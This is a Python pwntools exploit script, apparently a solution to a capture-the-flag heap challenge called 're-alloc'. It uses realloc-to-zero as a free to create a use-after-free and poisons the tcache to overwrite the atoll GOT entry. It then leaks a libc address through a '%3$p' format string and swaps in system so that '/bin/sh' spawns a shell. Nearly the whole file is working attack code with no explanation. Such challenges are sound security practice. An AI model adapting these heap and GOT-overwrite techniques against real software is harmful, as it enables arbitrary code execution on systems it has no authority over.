#!/usr/bin/env python3

from pwn import *
import time,os

elf = ELF("./re-alloc")
libc = ELF("./libc.so.6")

context.binary = elf
context.log_level = 'debug'

#context.terminal = (["xfce4-terminal","--geometry","100x40+1100+40"])

def alloc(idx, size, data):
    p.sendlineafter("choice:","1")
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def realloc(idx, size, data):
    p.sendlineafter("choice:","2")
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def leak(idx):
    p.sendlineafter("choice:","3")
    p.recvuntil("Index:")
    p.send(idx)
    addr = int(p.recvline()[:-10],0)
    return addr

def realloc_free(idx, size, data):
    p.sendlineafter("choice:","2")
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("Size:",str(size))

def free(idx):
    p.sendlineafter("choice:","3")
    p.sendlineafter("Index:",str(idx))

def free_send(idx):
    p.sendlineafter("choice:","3")
    p.recvuntil("Index:")
    p.send(idx)

def alloc_send(idx,size,data):
    p.sendlineafter("choice:","1")
    p.recvuntil("Index:")
    p.send(idx)
    p.recvuntil("Size:")
    p.send(size)
    p.recvuntil("Data:")
    p.send(data)


p = process(elf.path)

#time.sleep(2)
#gdb.attach(p, gdbscript='''
#           break *0x000000000040129d
#''')
#time.sleep(2)

atoll_got = elf.got["atoll"]
printf_plt = elf.plt["printf"]

alloc(1,90,"Y"*20)           
realloc_free(1,0,"")              # free
realloc(1,90,p64(atoll_got)) 
alloc(0,90,"A"*20)

realloc(0,120,"CCCCCCCC")
free(0)
realloc(1,120,"BBBBBBBB")
free(1)

alloc(1,40,"Y"*20)
realloc_free(1,0,"")              # free
realloc(1,40,p64(atoll_got))
alloc(0,40,"A"*20)

realloc(0,120,"CCCCCCCC")
free(0)
realloc(1,120,"BBBBBBBB")
free(1)

# LEAK ADDRESS
alloc(1,90,p64(printf_plt)) # 
libc.address = leak(str("%3$p")) - 0x12e009
print("Libc addr: " + hex(libc.address))

# SPAWN SYSTEM
alloc_send(p64(0),"%40c",p64(libc.sym["system"])) # -> free this
free_send("/bin/sh")

gdb.attach(p)
p.interactive()
